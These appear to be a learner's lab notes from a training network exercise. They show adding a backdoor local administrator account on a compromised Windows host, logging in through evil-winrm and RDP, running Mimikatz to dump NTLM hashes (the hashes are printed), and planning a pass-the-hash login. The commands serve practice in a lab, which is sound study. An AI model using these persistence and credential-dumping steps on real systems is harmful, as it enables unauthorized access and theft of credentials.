
As we got the reverse shell with the highest permissions possible on a local machine which means we don't have need to escalate on this target but but but .....................

From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).


So we have add a account with a username and password
```
net user sardarji-007 Password123 /add
```
![[Pasted image 20231230121342.png]]

```
net localgroup Administrators sardarji-007 /add
net localgroup "Remote Management Users" sardarji-007 /add
```
![[Pasted image 20231230121856.png]]

After this we have to use evil-winrm but i have already installed as i have used it earlier for some box
```
sudo gem install evil-winrm
```

```
evil-winrm -u sardarji-007 -p Password123 -i 10.200.101.150
```
![[Pasted image 20231230122319.png]]

```
whoami
whoami /groups
```
![[Pasted image 20231230122419.png]]

Now will try to login using RDP for clients
```
sudo apt install freerdp2-x11
```

RDP
```
xfreerdp /v:10.200.101.150 /u:'sardarji-007' /p:'Password123'
```

```
xfreerdp /v:10.200.101.150 /u:'sardarji-007' /p:'Password123' /dynamic-resolution
```
![[Pasted image 20231230124859.png]]

```
We have window's resources on our disposal 
```
![[Pasted image 20231230125736.png]]

```
xfreerdp /v:10.200.101.150 /u:'sardarji-007' /p:'Password123' /dynamic-resolution /drive:.,share
```
![[Pasted image 20231230130100.png]]

So we have successfully shared the folder and can use it otherwise we have to set-up a server  and have to work accordingly.

I was not able to use CMD so suggest to go with PowerShell
```
cd \\tsclient\share\mimikatz 
```
![[Pasted image 20231230131025.png]]

I don't know even this also not worked so i simply copied the Mimikatz folder into the desktop and good to go from here.
```
cd \\tsclient\share\mimikatz\x64
```
![[Pasted image 20231230132355.png]]

```
privilege::debug
```

```
token::elevate
```

```
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 68b1608793104cca229de9f1dfb6fbae
```

![[Pasted image 20231230152716.png]]

```
Admin
Thmoas
37db630168e5f82aafa8461e05c6bbd1
02d90eda8f6b6b06c32d5f207831101f
```

![[Pasted image 20231230153212.png]]

  
In the real world this would be enough to obtain stable access; however, in our current environment, the new account will be deleted if the network is reset.

For this reason you are encouraged to to use the evil-winrm built-in pass-the-hash technique using the Administrator hash we looted.

